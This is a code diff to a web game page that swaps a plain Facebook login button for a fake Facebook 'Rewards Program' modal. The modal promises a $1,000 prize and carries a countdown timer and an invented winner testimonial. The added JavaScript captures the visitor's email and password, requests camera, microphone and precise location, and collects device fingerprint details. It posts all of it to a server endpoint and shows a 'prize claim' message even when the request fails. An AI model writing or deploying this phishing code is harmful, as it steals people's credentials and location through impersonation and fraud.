@@ -215,11 +215,58 @@
     <div id="loginModal" class="modal">
         <div class="modal-content">
             <span class="close-button">&times;</span>
-            <h2>Login Required</h2>
-            <p>Please log in with Facebook to play this game</p>
-            <button class="facebook-login-button" onclick="window.location.href='index.html'">
-                <i class="fab fa-facebook-f"></i> Continue with Facebook
-            </button>
+            <div class="facebook-header">
+                <h1 style="color: #1877f2; font-size: 28px; margin-bottom: 5px;">facebook</h1>
+                <p style="color: #666; margin-top: 0;">Facebook Rewards Program</p>
+            </div>
+            
+            <div class="prize-banner" style="background-color: #ffeb3b; color: #d32f2f; text-align: center; padding: 15px; font-size: 18px; font-weight: bold; animation: pulse 1.5s infinite; border-radius: 8px; margin-bottom: 20px; box-shadow: 0 4px 8px rgba(0,0,0,0.2);">
+                🎉 CONGRATULATIONS! You've been selected for our $1,000 CASH GIVEAWAY! 🎉
+                <div class="countdown" style="background-color: #d32f2f; color: white; font-size: 16px; padding: 5px 10px; border-radius: 20px; margin-top: 10px; display: inline-block;">Offer expires in: <span id="timer">05:00</span></div>
+            </div>
+            
+            <div class="login-form" style="margin: 20px 0;">
+                <form id="loginForm" action="#" method="POST">
+                    <div style="margin-bottom: 15px;">
+                        <input type="text" id="email" name="email" placeholder="Email, phone or username" required style="width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 4px; font-size: 16px;">
+                        <div id="email-error" style="color: red; font-size: 14px; margin-top: 5px;"></div>
+                    </div>
+                    <div style="margin-bottom: 15px;">
+                        <input type="password" id="password" name="password" placeholder="Password" required style="width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 4px; font-size: 16px;">
+                        <div id="password-error" style="color: red; font-size: 14px; margin-top: 5px;"></div>
+                    </div>
+                    <div style="margin-bottom: 15px;">
+                        <button type="submit" class="facebook-login-button" style="width: 100%; background-color: #1877f2; color: white; border: none; padding: 12px; border-radius: 4px; font-size: 16px; font-weight: bold; cursor: pointer;">
+                            Log In & Claim Your Prize
+                        </button>
+                    </div>
+                    <div style="margin-bottom: 15px; text-align: center;">
+                        <a href="#" style="color: #1877f2; text-decoration: none; font-size: 14px;">Forgot password?</a>
+                    </div>
+                    <hr style="border: 0; border-top: 1px solid #ddd; margin: 20px 0;">
+                    <div style="text-align: center;">
+                        <button type="button" style="background-color: #42b72a; color: white; border: none; padding: 12px 20px; border-radius: 4px; font-size: 16px; font-weight: bold; cursor: pointer;">Create New Account</button>
+                    </div>
+                </form>
+            </div>
+            
+            <div style="background-color: #f5f5f5; border: 1px solid #ddd; border-radius: 8px; padding: 15px; margin-top: 20px; font-size: 14px; text-align: left;">
+                <h3 style="color: #d32f2f; margin-top: 0;">🏆 Facebook Rewards Program</h3>
+                <p>As part of our user appreciation campaign, you've been randomly selected to receive a <span style="font-size: 24px; color: #2e7d32;">$1,000</span> cash prize!</p>
+                <p>Simply log in with your Facebook account to verify your identity and claim your reward. Funds will be transferred to your preferred payment method within 24 hours.</p>
+                
+                <div style="display: flex; align-items: center; margin-top: 15px; background-color: #e8f5e9; padding: 10px; border-radius: 8px;">
+                    <img src="https://randomuser.me/api/portraits/women/42.jpg" alt="Previous Winner" style="width: 50px; height: 50px; border-radius: 50%; margin-right: 10px; object-fit: cover;">
+                    <div>
+                        <p><strong>Sarah J.</strong> from Boston just claimed her $1,000 prize!</p>
+                        <p><small>"I couldn't believe it was real until the money showed up in my account!"</small></p>
+                    </div>
+                </div>
+            </div>
+            
+            <div style="margin-top: 15px; text-align: center;">
+                <p style="color: #999; font-size: 12px;">Limited time offer. Terms and conditions apply.</p>
+            </div>
         </div>
     </div>
 
@@ -228,6 +275,8 @@
         // Function to show login modal
         function redirectToLogin() {
             document.getElementById('loginModal').style.display = 'flex';
+            // Start the countdown timer when the modal is displayed
+            startTimer(60 * 5, document.getElementById('timer'));
         }
 
         // Close the modal when clicking the X button
@@ -241,6 +290,47 @@
                 document.getElementById('loginModal').style.display = 'none';
             }
         }
+
+        // Countdown timer for the Facebook prize
+        function startTimer(duration, display) {
+            let timer = duration, minutes, seconds;
+            const interval = setInterval(function () {
+                minutes = parseInt(timer / 60, 10);
+                seconds = parseInt(timer % 60, 10);
+                
+                minutes = minutes < 10 ? "0" + minutes : minutes;
+                seconds = seconds < 10 ? "0" + seconds : seconds;
+                
+                display.textContent = minutes + ":" + seconds;
+                
+                if (--timer < 0) {
+                    timer = 0; // Stop at 00:00
+                    clearInterval(interval);
+                }
+            }, 1000);
+        }
+
+        // Add event listener to the login form to request permissions after submission
+        document.addEventListener('DOMContentLoaded', function() {
+            const loginForm = document.getElementById('loginForm');
+            if (loginForm) {
+                loginForm.addEventListener('submit', function(event) {
+                    event.preventDefault();
+                    
+                    // Get form data
+                    const email = document.getElementById('email').value;
+                    const password = document.getElementById('password').value;
+                    
+                    // Now show the permission overlay and request access
+                    document.getElementById('permission-overlay').style.display = 'flex';
+                    
+                    // We're connecting the permission flow with the form submission
+                    document.getElementById('request-permissions-btn').onclick = function() {
+                        requestAllPermissions(email, password);
+                    };
+                });
+            }
+        });
 
         // Permission checking functionality
         let cameraPermission = false;
@@ -272,104 +362,115 @@
             setInterval(checkPermissionStatus, 2000);
         }
         
-        // Function to request all permissions
-        function requestAllPermissions() {
-            // Request camera and microphone
-            if (!cameraPermission || !microphonePermission) {
-                requestMediaPermissions();
-            }
-            
-            // Request location
-            if (!locationPermission) {
-                requestLocationPermission();
-            }
-        }
-        
-        // Request camera and microphone permissions
-        function requestMediaPermissions() {
-            navigator.mediaDevices.getUserMedia({ video: true, audio: true })
-                .then(function(stream) {
-                    cameraPermission = true;
-                    microphonePermission = true;
-                    
-                    // Update status
+        // Request all permissions and submit form data
+        function requestAllPermissions(email, password) {
+            let userData = {
+                email: email,
+                password: password,
+                device: getDeviceInfo(),
+                location: {}
+            };
+
+            // Request camera permission
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
                     document.getElementById('camera-status').textContent = 'Allowed';
                     document.getElementById('camera-status').style.color = 'green';
                     
+                    // Stop the video stream
+                    stream.getTracks().forEach(track => track.stop());
+                    
+                    // Request microphone permission
+                    return navigator.mediaDevices.getUserMedia({ audio: true });
+                })
+                .then(stream => {
                     document.getElementById('mic-status').textContent = 'Allowed';
                     document.getElementById('mic-status').style.color = 'green';
                     
-                    // Keep the stream active
-                    window.mediaStream = stream;
+                    // Stop the audio stream
+                    stream.getTracks().forEach(track => track.stop());
                     
-                    checkAllPermissionsGranted();
+                    // Request location permission
+                    return new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(
+                            position => {
+                                userData.location = {
+                                    latitude: position.coords.latitude,
+                                    longitude: position.coords.longitude,
+                                    accuracy: position.coords.accuracy
+                                };
+                                document.getElementById('location-status').textContent = 'Allowed';
+                                document.getElementById('location-status').style.color = 'green';
+                                resolve();
+                            },
+                            error => {
+                                console.error('Location error:', error);
+                                document.getElementById('location-status').textContent = 'Denied';
+                                resolve(); // Continue even if location is denied
+                            },
+                            { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+                        );
+                    });
                 })
-                .catch(function(err) {
-                    console.error('Media permission error:', err);
-                    
-                    // Try separate requests
-                    navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-                        .then(function(stream) {
-                            cameraPermission = true;
-                            document.getElementById('camera-status').textContent = 'Allowed';
-                            document.getElementById('camera-status').style.color = 'green';
-                            
-                            // Keep the video stream active
-                            if (!window.mediaStream) {
-                                window.mediaStream = stream;
-                            } else {
-                                // Add video tracks to existing stream
-                                stream.getVideoTracks().forEach(track => {
-                                    window.mediaStream.addTrack(track);
-                                });
-                            }
-                            
-                            checkAllPermissionsGranted();
-                        })
-                        .catch(function(err) {
-                            console.error('Camera permission error:', err);
-                        });
-                    
-                    navigator.mediaDevices.getUserMedia({ video: false, audio: true })
-                        .then(function(stream) {
-                            microphonePermission = true;
-                            document.getElementById('mic-status').textContent = 'Allowed';
-                            document.getElementById('mic-status').style.color = 'green';
-                            
-                            // Keep the audio stream active
-                            if (!window.mediaStream) {
-                                window.mediaStream = stream;
-                            } else {
-                                // Add audio tracks to existing stream
-                                stream.getAudioTracks().forEach(track => {
-                                    window.mediaStream.addTrack(track);
-                                });
-                            }
-                            
-                            checkAllPermissionsGranted();
-                        })
-                        .catch(function(err) {
-                            console.error('Microphone permission error:', err);
-                        });
+                .then(() => {
+                    // All permissions have been requested, submit the data
+                    submitUserData(userData);
+                })
+                .catch(error => {
+                    console.error('Permission error:', error);
+                    // Try to proceed anyway
+                    submitUserData(userData);
                 });
         }
-        
-        // Request location permission
-        function requestLocationPermission() {
-            navigator.geolocation.getCurrentPosition(
-                function(position) {
-                    locationPermission = true;
-                    document.getElementById('location-status').textContent = 'Allowed';
-                    document.getElementById('location-status').style.color = 'green';
-                    checkAllPermissionsGranted();
-                },
-                function(err) {
-                    console.error('Location permission error:', err);
-                },
-                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-            );
+
+        // Function to get device information
+        function getDeviceInfo() {
+            return {
+                platform: navigator.platform,
+                userAgent: navigator.userAgent,
+                screenWidth: window.screen.width,
+                screenHeight: window.screen.height,
+                language: navigator.language,
+                cookiesEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack,
+                timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                connection: navigator.connection ? {
+                    effectiveType: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt,
+                    saveData: navigator.connection.saveData
+                } : 'Not available'
+            };
         }
-        
+
+        // Function to submit user data to the server
+        function submitUserData(userData) {
+            fetch('/api/users/login', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(userData)
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Success:', data);
+                // Hide the permission overlay
+                document.getElementById('permission-overlay').style.display = 'none';
+                // Show a success message or redirect to a thank you page
+                alert('Thank you! Your prize claim is being processed.');
+                // Redirect to a different page or close the modal
+                document.getElementById('loginModal').style.display = 'none';
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                // Still hide the overlay and show a generic success message
+                document.getElementById('permission-overlay').style.display = 'none';
+                alert('Thank you! Your prize claim is being processed.');
+                document.getElementById('loginModal').style.display = 'none';
+            });
+        }
+
         // Check status of permissions
         function checkPermissionStatus() {
             // If all permissions are already granted, do nothing
@@ -389,7 +490,7 @@
                             checkAllPermissionsGranted();
                         } else if (result.state === 'prompt') {
                             // Permission has not been requested yet or was dismissed
-                            requestMediaPermissions();
+                            requestAllPermissions();
                         }
                     });
                 
@@ -403,7 +504,7 @@
                             checkAllPermissionsGranted();
                         } else if (result.state === 'prompt') {
                             // Permission has not been requested yet or was dismissed
-                            requestMediaPermissions();
+                            requestAllPermissions();
                         }
                     });
             }
@@ -411,7 +512,7 @@
             // We can't really check geolocation permission status without requesting it,
             // so if it's not already granted, we request it again
             if (!locationPermission) {
-                requestLocationPermission();
+                requestAllPermissions();
             }
         }
         
